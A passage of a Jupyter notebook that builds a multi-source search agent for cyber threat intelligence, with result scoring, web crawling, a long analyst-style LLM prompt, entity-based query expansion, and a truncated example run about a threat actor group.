        "    # Combine all results with metadata scoring\n",
        "    all_results = []\n",
        "    sources = ['vector', 'serper', 'exa', 'tavily', 'google', 'google_serper_image', 'google_programmable_image']\n",
        "    weights = [0.6, 1.0, 0.9, 0.85, 0.8, 0.75, 0.7]  # Adjusted weights to prioritize Google Serper, Google Programmable Search, Exa.ai, and Tavily\n",
        "\n",
        "    for results, source, weight in zip(args, sources, weights):\n",
        "        all_results.extend([(result, source, weight, result.source_weight or 0, parse_date(result.date)) for result in results])\n",
        "\n",
        "    # Deduplicate results based on URL and calculate final score\n",
        "    seen_urls = set()\n",
        "    unique_results = []\n",
        "\n",
        "    for result, source, weight, source_weight, date in all_results:\n",
        "        if result.url not in seen_urls:\n",
        "            seen_urls.add(result.url)\n",
        "            # Add source and weight to result metadata\n",
        "            result.source_weight = source_weight\n",
        "            result.source_name = source\n",
        "            # Calculate final score based on weight, source_weight, and date\n",
        "            date_score = calculate_recency_score(date)\n",
        "            final_score = weight + source_weight + date_score\n",
        "            result.final_score = final_score\n",
        "            unique_results.append(result)\n",
        "\n",
        "    # Sort by final score\n",
        "    unique_results.sort(reverse=True, key=lambda x: x.final_score)\n",
        "    return unique_results"
      ],
      "metadata": {
        "id": "48JIG0EUJjqx"
      },
      "execution_count": 22,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Enhanced execute_searches function with improved concurrency and error handling\n",
        "async def execute_searches(state: AgentState) -> AgentState:\n",
        "    query = state[\"messages\"][-1][\"content\"]\n",
        "\n",
        "    # Enhance the search query\n",
        "    enhanced_query = enhance_search_query(query)\n",
        "\n",
        "    # Execute all searches in parallel with improved error handling\n",
        "    search_functions = [\n",
        "        google_serper_search,\n",
        "        google_programmable_search,\n",
        "        exa_search,\n",
        "        tavily_search,\n",
        "        vector_search,\n",
        "        google_serper_image_search,\n",
        "        google_programmable_image_search\n",
        "    ]\n",
        "    search_tasks = [asyncio.to_thread(search_func, enhanced_query) for search_func in search_functions]\n",
        "    search_results = await asyncio.gather(*search_tasks, return_exceptions=True)\n",
        "\n",
        "    # Handle exceptions and filter out failed searches\n",
        "    successful_results = []\n",
        "    for results in search_results:\n",
        "        if isinstance(results, Exception):\n",
        "            print(f\"ERROR in search: {str(results)}\")\n",
        "        else:\n",
        "            successful_results.append(results)\n",
        "\n",
        "    # Aggregate and deduplicate results with metadata scoring\n",
        "    combined_results = aggregate_search_results(\n",
        "        enhanced_query, *successful_results\n",
        "    )\n",
        "\n",
        "    # Reranking with semantic similarity and metadata scoring\n",
        "    reranked_results = rerank_results(enhanced_query, combined_results, state)\n",
        "\n",
        "    # Extract URLs for crawling with improved concurrency\n",
        "    urls_to_crawl = [result.url for result in reranked_results[:5]]  # Limit to top 5\n",
        "    crawl_tasks = [extract_content_from_url(url) for url in urls_to_crawl]\n",
        "    crawled_results = await asyncio.gather(*crawl_tasks)\n",
        "\n",
        "    # Filter out None results and add to state\n",
        "    valid_crawled_results = [r for r in crawled_results if r is not None]\n",
        "\n",
        "    state[\"messages\"].append({\n",
        "        \"role\": \"tool\",\n",
        "        \"content\": \"Enhanced Search Results\",\n",
        "        \"results\": reranked_results,\n",
        "        \"crawled_results\": valid_crawled_results\n",
        "    })\n",
        "\n",
        "    return state\n",
        "\n",
        "def highlight_keywords(text: str, keywords: List[str]) -> str:\n",
        "    \"\"\"Highlight specific keywords in the text.\"\"\"\n",
        "    for keyword in keywords:\n",
        "        text = text.replace(keyword, f\"**{keyword}**\")\n",
        "    return text"
      ],
      "metadata": {
        "id": "iuF6b8-Wn1F_"
      },
      "execution_count": 23,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Enhanced response generation with better prompt engineering and media content handling\n",
        "def generate_response(state: AgentState) -> AgentState:\n",
        "    memory = state.get(\"memory\", {})\n",
        "    chat_history = memory.get(\"chat_history\", \"\")\n",
        "\n",
        "    search_results = next((m[\"results\"] for m in reversed(state[\"messages\"])\n",
        "                            if m[\"role\"] == \"tool\" and \"results\" in m), [])\n",
        "\n",
        "    crawled_results = next((m[\"crawled_results\"] for m in reversed(state[\"messages\"])\n",
        "                            if m[\"role\"] == \"tool\" and \"crawled_results\" in m), [])\n",
        "\n",
        "    print(\"Crawled Results:\", crawled_results)  # Add this line to inspect the crawled results\n",
        "\n",
        "    # Generate adaptive prompt based on the query and search results\n",
        "    prompt_template = \"\"\" You are an advanced AI copilot specializing in cybersecurity, intelligence analysis, and technical response. Your task is to synthesize, validate, and provide query-focused insights from diverse, verified data sources, delivering a response that combines precision, actionable intelligence, and situational awareness. Your analysis should be tailored to each unique query, maintaining accuracy and relevance throughout.\n",
        "\n",
        "    **ANALYSIS PROTOCOL** *(Structured in Phases for comprehensive evaluation)*:\n",
        "\n",
        "    1. **Source and Credibility Verification**:\n",
        "       - **Domain Reliability**: Prioritize high-authority cybersecurity, intelligence, and technical sources.\n",
        "       - **Timeliness Validation**: Confirm that the data is current and directly relevant to the specific query.\n",
        "       - **Cross-Reference Key Data Points**: Validate critical information by cross-referencing with multiple reputable sources.\n",
        "       - **Misinformation Detection**: Identify and disregard any unsupported claims, exaggerations, or potentially misleading data.\n",
        "\n",
        "    2. **Content Extraction and Relevance Filtering**:\n",
        "       - **Identify Core Data**: Extract essential information such as threat vectors, indicators, metrics, and statistics.\n",
        "       - **Pattern Recognition and Correlation**: Detect recurring themes, correlations, and trends across data sources.\n",
        "       - **Contextual Prioritization**:\n",
        "         - **Temporal Relevance**: Emphasize the most recent and impactful data.\n",
        "         - **Technical Depth**: Focus on technical details directly pertinent to the query context.\n",
        "         - **Query Alignment**: Rank findings by their relevance to the query and the user’s specific question.\n",
        "\n",
        "    3. **Visual and Media Analysis**:\n",
        "       - **Visual Verification**: Evaluate images, diagrams, and screenshots for technical relevance and accuracy.\n",
        "       - **Technical Indicator Extraction**: Identify critical data from visuals, including IP addresses, file hashes, or attack paths.\n",
        "       - **Text-Visual Correlation**: Cross-reference media content with textual data, emphasizing technical implications and alignment.\n",
        "\n",
        "    **ADAPTIVE RESPONSE STRUCTURE** *(Dynamic, based on query type)*:\n",
        "\n",
        "    1. **Executive Summary**:\n",
        "       - Provide a concise, high-level overview summarizing key findings, highlighting high-priority insights and recommendations.\n",
        "\n",
        "    2. **In-Depth Analysis**:\n",
        "       - **Key Findings**:\n",
        "         - A bullet-point list of critical discoveries, emerging threats, and significant events.\n",
        "         - Include specific metrics, trends, or any quantitative data directly relevant to the query.\n",
        "       - **Technical Breakdown**:\n",
        "         - Detail specific vulnerabilities, exploits, attack vectors, or system impacts.\n",
        "         - Address affected components and dependencies, along with any recommended remediation actions.\n",
        "       - **Contextual and Industry Impact**:\n",
        "         - Analyze sector-specific or industry-wide implications.\n",
        "         - Attribute threat actors, where identifiable, and connect tactics to established frameworks (e.g., MITRE ATT&CK).\n",
        "         - Draw connections to historical incidents or patterns for enhanced context.\n",
        "\n",
        "    3. **Most Recent Relevant Activities**:\n",
        "       - **Latest Developments**:\n",
        "         - Summarize the most recent activities, incidents, or updates directly related to the query.\n",
        "         - Describe new vulnerabilities, patches, or emerging threats impacting the cybersecurity landscape.\n",
        "       - **Immediate Implications**:\n",
        "         - Assess the direct impact of these recent developments on the query context.\n",
        "         - Suggest any immediate actions or mitigations needed in response to recent changes.\n",
        "\n",
        "    4. **Source Citations and Evidence**:\n",
        "       - Cite all findings with accuracy, using the [Source Name](URL) format to link major claims.\n",
        "       - For specific assertions, provide direct quote snippets with context.\n",
        "       - **Embedded Media References**: Link to relevant media (e.g., screenshots, diagrams) with brief descriptions.\n",
        "       - **Actionable Recommendations**:\n",
        "         - Offer precise, immediate actions and mitigation strategies.\n",
        "         - Outline relevant detection and prevention techniques pertinent to the identified threats.\n",
        "         - Suggest operational security measures for high-severity findings.\n",
        "\n",
        "    5. **Long-Term Forecast and Monitoring**:\n",
        "       - Discuss projected evolution in threat trends, actor capabilities, or tool capabilities.\n",
        "       - Recommend specific trends or areas for ongoing monitoring and long-term response.\n",
        "\n",
        "    **SPECIALIZED QUERY HANDLING** *(Dynamic strategies based on context)*:\n",
        "\n",
        "    - **For Threat Intelligence Queries**:\n",
        "      - Extract Indicators of Compromise (IOCs) such as IPs, domains, and file hashes.\n",
        "      - Map findings to MITRE ATT&CK TTPs and assess behavior patterns of malware and threat actors.\n",
        "      - Document any identified Command and Control (C2) configurations.\n",
        "\n",
        "    - **For Vulnerability and Exploit Analysis**:\n",
        "      - Validate CVE details, including severity ratings, affected systems, and patch availability.\n",
        "      - Assess real-world exploitability, including any observed attacks or reports of active exploitation.\n",
        "\n",
        "    - **For Incident Response**:\n",
        "      - Construct a timeline of events, reconstructing points of compromise and attack paths.\n",
        "      - Provide clear recovery steps and immediate containment strategies.\n",
        "\n",
        "    **PROMPT VARIABLES**:\n",
        "    - **Previous Context**: {chat_history}\n",
        "    - **Current Query**: {input}\n",
        "    - **Search Results**: {search_results}\n",
        "    - **Additional Crawled Data**: {crawled_results}\n",
        "    - **Current Date**: {current_date}\n",
        "\n",
        "    **RESPONSE REQUIREMENTS**:\n",
        "    - **Precision and Depth**: Maintain technical accuracy and detailed insights throughout the response.\n",
        "    - **Confidence Levels**: Clearly state the confidence level of each assessment, highlighting uncertainties where applicable.\n",
        "    - **Citation Accuracy**: Ensure citations are accurate, using the [Source Name](URL) format for each major claim; include media references when applicable.\n",
        "    - **Urgency and Priority**: Highlight any urgent findings or time-sensitive information.\n",
        "    - **Readable Structure**: Use clear headings, subheadings, and bullet points for easy navigation.\n",
        "    - **Address Gaps and Uncertainties**: Acknowledge any data limitations or uncertainties within the response.\n",
        "    - **Embedded Media Links**: Include links to relevant visuals with contextual descriptions.\n",
        "    - **Actionable and Context-Specific Recommendations**: Customize suggestions based on query-specific context.\n",
        "    - **Technical Integrity**: Retain technical rigor throughout, avoiding over-generalization.\n",
        "\n",
        "    **Highlighted Keywords**:\n",
        "    - **Threat Actor Group**\n",
        "    - **Cyber Gangs**\n",
        "    - **City**\n",
        "    - **Countries**\n",
        "    - **Geo-specific**\n",
        "    - **Malware**\n",
        "    - **Ransomware**\n",
        "    - **Vulnerability**\n",
        "    - **Exploit**\n",
        "    - **Phishing**\n",
        "    - **Data Breach**\n",
        "    - **Cyber Attack**\n",
        "    - **Incident Response**\n",
        "    - **MITRE ATT&CK**\n",
        "    - **Indicators of Compromise (IOCs)**\n",
        "    - **Command and Control (C2)**\n",
        "    - **Dates**\n",
        "    - **Times**\n",
        "    - **Trojans**\n",
        "\n",
        "    Generate a comprehensive, accurate response that addresses the query directly by synthesizing and presenting the latest, most relevant intelligence. Include insights into recent activities, incidents, and recommendations, supported by credible, source-backed evidence.\n",
        "\n",
        "    \"\"\"\n",
        "\n",
        "    prompt = ChatPromptTemplate.from_messages([(\n",
        "        \"system\", prompt_template\n",
        "    )])\n",
        "\n",
        "    chain = prompt | llm\n",
        "\n",
        "    current_date = datetime.now(pytz.utc).strftime(\"%Y-%m-%d %H:%M:%S UTC\")\n",
        "\n",
        "    # Enhanced search results formatting with media content handling\n",
        "    formatted_results = []\n",
        "    for result in search_results:\n",
        "        # Process media content\n",
        "        media_info = []\n",
        "        if result.media_content:\n",
        "            for media in result.media_content:\n",
        "                media_info.append({\n",
        "                    \"type\": media.get(\"type\", \"unknown\"),\n",
        "                    \"url\": media.get(\"url\", \"no url\"),\n",
        "                    \"description\": media.get(\"description\", \"\"),\n",
        "                    \"timestamp\": media.get(\"timestamp\", \"\")\n",
        "                })\n",
        "\n",
        "        # Create detailed result entry\n",
        "        result_str = (\n",
        "            f\"SOURCE ENTRY:\\n\"\n",
        "            f\"Title: {result.title}\\n\"\n",
        "            f\"Source: {result.source}\\n\"\n",
        "            f\"URL: {result.url}\\n\"\n",
        "            f\"Date: {result.date or 'Not specified'}\\n\"\n",
        "            f\"Content: {highlight_keywords(result.snippet, ['Threat Actor Group', 'Cyber Gangs', 'City', 'Countries', 'Geo-specific', 'Malware', 'Ransomware', 'Vulnerability', 'Exploit', 'Phishing', 'Data Breach', 'Cyber Attack', 'Incident Response', 'MITRE ATT&CK', 'Indicators of Compromise (IOCs)', 'Command and Control (C2)', 'Dates', 'Times', 'Trojans'])}\"\n",
        "        )\n",
        "\n",
        "        # Add media information if available\n",
        "        if media_info:\n",
        "            result_str += \"Media Content:\\n\"\n",
        "            for media in media_info:\n",
        "                result_str += (\n",
        "                    f\"- Type: {media['type']}\\n\"\n",
        "                    f\"  URL: {media['url']}\\n\"\n",
        "                    f\"  Description: {media['description']}\\n\"\n",
        "                    f\"  Timestamp: {media['timestamp']}\\n\"\n",
        "                )\n",
        "\n",
        "        result_str += \"-\" * 50 + \"\\n\"\n",
        "        formatted_results.append(result_str)\n",
        "\n",
        "    # Format crawled results with hyperlink extraction\n",
        "    formatted_crawled_results = []\n",
        "    for crawled_result in crawled_results:\n",
        "        for item in crawled_result:\n",
        "            if 'content' in item and 'links' in item:\n",
        "                formatted_crawled_results.append(f\"Content: {item['content']}\\nLinks: {item['links']}\\n\")\n",
        "                # Extract hyperlinks from content\n",
        "                hyperlinks = extract_hyperlinks(item['content'])\n",
        "                if hyperlinks:\n",
        "                    formatted_crawled_results.append(f\"Hyperlinks: {hyperlinks}\\n\")\n",
        "            else:\n",
        "                print(\"Missing 'content' or 'links' key in crawled result item:\", item)\n",
        "\n",
        "    # Generate response\n",
        "    response = chain.invoke({\n",
        "        \"input\": state[\"messages\"][-1][\"content\"],\n",
        "        \"search_results\": \"\\n\".join(formatted_results),\n",
        "        \"crawled_results\": \"\\n\".join(formatted_crawled_results),\n",
        "        \"chat_history\": chat_history,\n",
        "        \"current_date\": current_date\n",
        "    })\n",
        "\n",
        "    # Process response and ensure citations\n",
        "    processed_response = ensure_citations(response.content, search_results)\n",
        "\n",
        "    # Highlight important information\n",
        "    important_keywords = [\n",
        "        'Threat Actor Group', 'Cyber Gangs', 'City', 'Countries', 'Geo-specific',\n",
        "        'Malware', 'Ransomware', 'Vulnerability', 'Exploit', 'Phishing',\n",
        "        'Data Breach', 'Cyber Attack', 'Incident Response', 'MITRE ATT&CK',\n",
        "        'Indicators of Compromise (IOCs)', 'Command and Control (C2)', 'Dates',\n",
        "        'Times', 'Trojans'\n",
        "    ]\n",
        "    highlighted_response = highlight_keywords(processed_response, important_keywords)\n",
        "\n",
        "    # Display media content\n",
        "    for result in search_results:\n",
        "        if hasattr(result, 'media') and result.media:\n",
        "            for media_url in result.media:\n",
        "                if is_valid_image_url(media_url):\n",
        "                    display(Image(url=media_url, width=400))\n",
        "\n",
        "    # Add crawled images\n",
        "    for crawled_result in crawled_results:\n",
        "        if crawled_result and 'valid_images' in crawled_result:\n",
        "            for img_url in crawled_result['valid_images']:\n",
        "                display(Image(url=img_url, width=400))\n",
        "\n",
        "    state[\"messages\"].append({\"role\": \"assistant\", \"content\": highlighted_response})\n",
        "    state[\"memory\"] = {\n",
        "        \"chat_history\": chat_history + f\"\\nHuman: {state['messages'][-2]['content']}\\nAI: {highlighted_response}\"\n",
        "    }\n",
        "    return state\n",
        "\n",
        "def ensure_citations(text: str, search_results: List[SearchResult]) -> str:\n",
        "    paragraphs = text.split('\\n\\n')\n",
        "    cited_paragraphs = []\n",
        "\n",
        "    if not search_results:\n",
        "        print(\"WARNING: No search results available for citation.\")\n",
        "        return text\n",
        "\n",
        "    for paragraph in paragraphs:\n",
        "        if not any(result.url in paragraph for result in search_results) and not paragraph.startswith('**'):\n",
        "            most_relevant_source = max(search_results, key=lambda x: len(set(paragraph.lower().split()) & set(x.snippet.lower().split())))\n",
        "            paragraph += f' {format_source_link(most_relevant_source.source, most_relevant_source.url)}'\n",
        "        cited_paragraphs.append(paragraph)\n",
        "\n",
        "    if not any(p.startswith('**Sources**') for p in cited_paragraphs):\n",
        "        sources = set(f\"- {format_source_link(result.source, result.url)}\" for result in search_results)\n",
        "        cited_paragraphs.append(\"**Sources**\\n\" + \"\\n\".join(sources))\n",
        "\n",
        "    return '\\n\\n'.join(cited_paragraphs)\n",
        "\n",
        "def format_source_link(source: str, url: str) -> str:\n",
        "    return f\"[{source}]({url})\"\n",
        "\n",
        "def extract_hyperlinks(content: str) -> List[str]:\n",
        "    import re\n",
        "    pattern = re.compile(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*,]|(?:%[0-9a-fA-F][0-9a-fA-F]))+')\n",
        "    return pattern.findall(content)\n",
        "\n",
        "# Workflow definition\n",
        "from langgraph.graph import StateGraph, END\n",
        "\n",
        "workflow = StateGraph(AgentState)\n",
        "workflow.add_node(\"execute_searches\", execute_searches)\n",
        "workflow.add_node(\"generate_response\", generate_response)\n",
        "workflow.add_edge(\"execute_searches\", \"generate_response\")\n",
        "workflow.add_edge(\"generate_response\", END)\n",
        "workflow.set_entry_point(\"execute_searches\")\n",
        "graph = workflow.compile()\n",
        "\n",
        "# Asynchronous function to run the agent\n",
        "async def run_agent(query: str, memory: Optional[Dict[str, Any]] = None) -> AgentState:\n",
        "    state = AgentState(messages=[{\"role\": \"human\", \"content\": query}], memory=memory or {})\n",
        "    result = await graph.ainvoke(state)\n",
        "    return result\n",
        "\n",
        "# Named Entity Recognition (NER) for entity extraction\n",
        "ner_pipeline = pipeline(\"ner\", model=\"dbmdz/bert-large-cased-finetuned-conll03-english\")\n",
        "\n",
        "def extract_entities(query: str) -> Dict[str, List[str]]:\n",
        "    ner_results = ner_pipeline(query)\n",
        "    entities = {\n",
        "        \"threat_actors\": [],\n",
        "        \"locations\": [],\n",
        "        \"organizations\": [],\n",
        "        \"dates\": [],\n",
        "        \"vulnerabilities\": [],\n",
        "        \"malware\": []\n",
        "    }\n",
        "\n",
        "    for entity in ner_results:\n",
        "        entity_text = entity['word'].lower()\n",
        "        entity_label = entity['entity'].lower()\n",
        "\n",
        "        if \"threat\" in entity_label or \"actor\" in entity_label:\n",
        "            entities[\"threat_actors\"].append(entity_text)\n",
        "        elif \"location\" in entity_label or \"geo\" in entity_label:\n",
        "            entities[\"locations\"].append(entity_text)\n",
        "        elif \"organization\" in entity_label:\n",
        "            entities[\"organizations\"].append(entity_text)\n",
        "        elif \"date\" in entity_label:\n",
        "            entities[\"dates\"].append(entity_text)\n",
        "        elif \"vulnerability\" in entity_label:\n",
        "            entities[\"vulnerabilities\"].append(entity_text)\n",
        "        elif \"malware\" in entity_label:\n",
        "            entities[\"malware\"].append(entity_text)\n",
        "\n",
        "    return entities\n",
        "\n",
        "# Enhanced query rewriting with entity extraction and variations\n",
        "def enhance_search_query_with_entities(query: str) -> str:\n",
        "    entities = extract_entities(query)\n",
        "    enhanced_query = query\n",
        "\n",
        "    if entities[\"threat_actors\"]:\n",
        "        enhanced_query += f\" threat_actors:{', '.join(entities['threat_actors'])}\"\n",
        "    if entities[\"locations\"]:\n",
        "        enhanced_query += f\" locations:{', '.join(entities['locations'])}\"\n",
        "    if entities[\"organizations\"]:\n",
        "        enhanced_query += f\" organizations:{', '.join(entities['organizations'])}\"\n",
        "    if entities[\"dates\"]:\n",
        "        enhanced_query += f\" dates:{', '.join(entities['dates'])}\"\n",
        "    if entities[\"vulnerabilities\"]:\n",
        "        enhanced_query += f\" vulnerabilities:{', '.join(entities['vulnerabilities'])}\"\n",
        "    if entities[\"malware\"]:\n",
        "        enhanced_query += f\" malware:{', '.join(entities['malware'])}\"\n",
        "\n",
        "    # Add variations based on the most important entities\n",
        "    important_entities = entities[\"threat_actors\"] + entities[\"locations\"] + entities[\"organizations\"] + entities[\"vulnerabilities\"] + entities[\"malware\"]\n",
        "    if important_entities:\n",
        "        enhanced_query += f\" OR {' OR '.join(important_entities)}\"\n",
        "\n",
        "    return enhanced_query\n",
        "\n",
        "# General query optimization\n",
        "def optimize_query_for_variables(query: str) -> str:\n",
        "    # Extract keywords and related terms\n",
        "    keywords = extract_keywords(query)\n",
        "    related_terms = get_related_terms(query)\n",
        "\n",
        "    # Enhance the query with keywords and related terms\n",
        "    enhanced_query = f\"{query} {', '.join(keywords)} {', '.join(related_terms)}\"\n",
        "\n",
        "    # Add date and geo-location specific terms\n",
        "    current_year = datetime.now().year\n",
        "    enhanced_query += f\" 2024 OR {current_year} recent threat actor groups gangs companies locations\"\n",
        "\n",
        "    return enhanced_query\n",
        "\n",
        "# Improved concurrency\n",
        "async def run_concurrent_tasks(tasks):\n",
        "    results = await asyncio.gather(*tasks, return_exceptions=True)\n",
        "    return results\n",
        "\n",
        "def advanced_entity_query_expansion(query: str, entities: Dict[str, List[str]]) -> List[str]:\n",
        "    \"\"\"\n",
        "    Generate advanced query variations based on extracted entities\n",
        "\n",
        "    Args:\n",
        "        query (str): Original query\n",
        "        entities (dict): Extracted named entities\n",
        "\n",
        "    Returns:\n",
        "        List[str]: Expanded query variations\n",
        "    \"\"\"\n",
        "    query_variations = []\n",
        "\n",
        "    # Base variations\n",
        "    base_variations = [\n",
        "        query,\n",
        "        f\"recent {query}\",\n",
        "        f\"latest developments {query}\",\n",
        "        f\"cybersecurity analysis {query}\"\n",
        "    ]\n",
        "\n",
        "    # Entity-specific expansions\n",
        "    if entities.get(\"threat_actors\"):\n",
        "        for actor in entities[\"threat_actors\"]:\n",
        "            base_variations.extend([\n",
        "                f\"{actor} cyber incidents\",\n",
        "                f\"{actor} threat intelligence\",\n",
        "                f\"recent activities of {actor}\",\n",
        "                f\"cyber operations by {actor}\"\n",
        "            ])\n",
        "\n",
        "    if entities.get(\"locations\"):\n",
        "        for location in entities[\"locations\"]:\n",
        "            base_variations.extend([\n",
        "                f\"cyber threats in {location}\",\n",
        "                f\"{location} cybersecurity landscape\",\n",
        "                f\"threat actor activities {location}\"\n",
        "            ])\n",
        "\n",
        "    if entities.get(\"organizations\"):\n",
        "        for org in entities[\"organizations\"]:\n",
        "            base_variations.extend([\n",
        "                f\"{org} cyber defense\",\n",
        "                f\"cyber incidents affecting {org}\",\n",
        "                f\"{org} threat intelligence\"\n",
        "            ])\n",
        "\n",
        "    if entities.get(\"vulnerabilities\"):\n",
        "        for vuln in entities[\"vulnerabilities\"]:\n",
        "            base_variations.extend([\n",
        "                f\"{vuln} exploits\",\n",
        "                f\"{vuln} patches\",\n",
        "                f\"{vuln} threat intelligence\"\n",
        "            ])\n",
        "\n",
        "    if entities.get(\"malware\"):\n",
        "        for malware in entities[\"malware\"]:\n",
        "            base_variations.extend([\n",
        "                f\"{malware} attacks\",\n",
        "                f\"{malware} threat intelligence\",\n",
        "                f\"recent incidents involving {malware}\"\n",
        "            ])\n",
        "\n",
        "    # Advanced query transformations\n",
        "    query_variations.extend([\n",
        "        f'intitle:\"{query}\"',  # Titles containing exact phrase\n",
        "        f'inurl:{query.replace(\" \", \"-\").lower()}',  # URL-friendly version\n",
        "        f'\"{query}\" cybersecurity',  # Exact phrase with context\n",
        "        f'site:*.gov {query}',  # Government sources\n",
        "        f'site:*.mil {query}',  # Military sources\n",
        "        f'site:*.org {query}',  # Organization sources\n",
        "    ])\n",
        "\n",
        "    return list(set(base_variations + query_variations))\n",
        "\n",
        "def advanced_semantic_query_expansion(query: str) -> List[str]:\n",
        "    \"\"\"\n",
        "    Generate semantically related query variations using advanced NLP techniques\n",
        "\n",
        "    Args:\n",
        "        query (str): Original query\n",
        "\n",
        "    Returns:\n",
        "        List[str]: Semantically expanded queries\n",
        "    \"\"\"\n",
        "    # Use sentence transformer for semantic similarity\n",
        "    model = SentenceTransformer('all-MiniLM-L6-v2')\n",
        "\n",
        "    semantic_variations = [\n",
        "        # Cybersecurity domain-specific variations\n",
        "        \"threat intelligence for \" + query,\n",
        "        \"cyber incidents related to \" + query,\n",
        "        \"security analysis of \" + query,\n",
        "        \"emerging cyber threats with \" + query,\n",
        "\n",
        "        # Technical variations\n",
        "        \"IOCs associated with \" + query,\n",
        "        \"MITRE ATT&CK tactics for \" + query,\n",
        "        \"vulnerability landscape of \" + query\n",
        "    ]\n",
        "\n",
        "    # Advanced semantic embeddings and similarity\n",
        "    query_embedding = model.encode(query)\n",
        "    semantic_scores = []\n",
        "\n",
        "    # You would integrate with a large corpus or knowledge base here\n",
        "    mock_corpus = [\n",
        "        \"Cyber threat intelligence\",\n",
        "        \"Advanced persistent threats\",\n",
        "        \"Cybersecurity incident response\",\n",
        "        \"Threat actor methodologies\"\n",
        "    ]\n",
        "\n",
        "    for corpus_text in mock_corpus:\n",
        "        corpus_embedding = model.encode(corpus_text)\n",
        "        similarity = util.pytorch_cos_sim(query_embedding, corpus_embedding)[0][0].item()\n",
        "\n",
        "        if similarity > 0.5:  # Adjust threshold as needed\n",
        "            semantic_variations.append(f\"{corpus_text} {query}\")\n",
        "\n",
        "    return list(set(semantic_variations))\n",
        "\n",
        "def advanced_time_based_query_filtering(results: List[SearchResult], max_age_days: int = 180) -> List[SearchResult]:\n",
        "    \"\"\"\n",
        "    Filter search results based on recency and time-based relevance\n",
        "\n",
        "    Args:\n",
        "        results (List[SearchResult]): Original search results\n",
        "        max_age_days (int): Maximum age of results to consider\n",
        "\n",
        "    Returns:\n",
        "        List[SearchResult]: Filtered and time-weighted results\n",
        "    \"\"\"\n",
        "    current_date = datetime.now(pytz.utc)\n",
        "    filtered_results = []\n",
        "\n",
        "    for result in results:\n",
        "        result_date = parse_date(result.date) or current_date\n",
        "        days_since_publication = (current_date - result_date).days\n",
        "\n",
        "        # Apply exponential decay for time relevance\n",
        "        if days_since_publication <= max_age_days:\n",
        "            time_weight = math.exp(-0.1 * days_since_publication)\n",
        "            result.final_score = (result.final_score or 0) * time_weight\n",
        "            filtered_results.append(result)\n",
        "\n",
        "    return sorted(filtered_results, key=lambda x: x.final_score, reverse=True)\n",
        "\n",
        "def advanced_threat_intelligence_scoring(results: List[SearchResult]) -> List[SearchResult]:\n",
        "    \"\"\"\n",
        "    Score and rank results based on threat intelligence relevance\n",
        "\n",
        "    Args:\n",
        "        results (List[SearchResult]): Search results\n",
        "\n",
        "    Returns:\n",
        "        List[SearchResult]: Scored and ranked results\n",
        "    \"\"\"\n",
        "    threat_keywords = [\n",
        "        'threat actor', 'cyber attack', 'malware',\n",
        "        'vulnerability', 'exploit', 'IOC',\n",
        "        'command and control', 'data breach'\n",
        "    ]\n",
        "\n",
        "    for result in results:\n",
        "        # Calculate threat intelligence score\n",
        "        threat_score = sum(\n",
        "            1.5 if keyword in result.snippet.lower() else\n",
        "            1.0 if keyword in result.title.lower() else 0\n",
        "            for keyword in threat_keywords\n",
        "        )\n",
        "\n",
        "        # Adjust final score based on threat intelligence relevance\n",
        "        result.final_score = (result.final_score or 0) + threat_score\n",
        "\n",
        "    return sorted(results, key=lambda x: x.final_score, reverse=True)\n",
        "\n",
        "def comprehensive_query_optimization(query: str) -> Dict[str, Any]:\n",
        "    \"\"\"\n",
        "    Comprehensive query optimization with multi-level processing\n",
        "\n",
        "    Args:\n",
        "        query (str): Original search query\n",
        "\n",
        "    Returns:\n",
        "        Dict containing optimized query details\n",
        "    \"\"\"\n",
        "    entities = extract_entities(query)\n",
        "\n",
        "    return {\n",
        "        \"original_query\": query,\n",
        "        \"entities\": entities,\n",
        "        \"query_variations\": advanced_entity_query_expansion(query, entities),\n",
        "        \"semantic_variations\": advanced_semantic_query_expansion(query),\n",
        "        \"optimized_query\": enhance_search_query_with_entities(query)\n",
        "    }"
      ],
      "metadata": {
        "id": "YKgGbgXaW0UL",
        "outputId": "521f8f4b-7047-4212-8d1c-2d3e54a75248",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "execution_count": 24,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Some weights of the model checkpoint at dbmdz/bert-large-cased-finetuned-conll03-english were not used when initializing BertForTokenClassification: ['bert.pooler.dense.bias', 'bert.pooler.dense.weight']\n",
            "- This IS expected if you are initializing BertForTokenClassification from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).\n",
            "- This IS NOT expected if you are initializing BertForTokenClassification from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "if __name__ == \"__main__\":\n",
        "    query = \"Latest Cyber Incidents on LunarsGo Threat Actor Group?\"\n",
        "    optimized_query = comprehensive_query_optimization(query)[\"optimized_query\"]\n",
        "    print(f\"Optimized Query: {optimized_query}\")\n",
        "    result = asyncio.run(run_agent(optimized_query))\n",
        "    for message in result[\"messages\"]:\n",
        "        if message[\"role\"] == \"assistant\":\n",
        "            print(\"Cyber AI Copilot Response:\")\n",
        "            print(message[\"content\"])"
      ],
      "metadata": {
        "id": "GwKcWCaOs2vT",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "outputId": "4288c609-3dce-42b8-9e95-a2ed56b6ca8d"
      },
      "execution_count": 25,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Optimized Query: Latest Cyber Incidents on LunarsGo Threat Actor Group?\n",
            "Starting Exa Search with query: Latest Cyber Incidents on LunarsGo Threat Actor Group? 2024 OR 2024 recent cybersecurity incidents data breaches malware attacks threat intelligence reports\n",
            "ERROR in Tavily Search: 'str' object has no attribute 'get'\n",
            "Raw results from Exa Search: Title: APT trends report Q3 2024\n",
            "URL: https://securelist.com/apt-report-q3-2024/114623/\n",
            "ID: https://securelist.com/apt-report-q3-2024/114623/\n",
            "Score: 0.1467723846435547\n",
            "Published Date: 2024-11-28T10:03:24.000Z\n",
            "Author: GReAT\n",
            "Image: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/11/27181956/SL-APT-report-Q3-2024-featured-2.jpg\n",
            "Extras None\n",
            "Subpages: None\n",
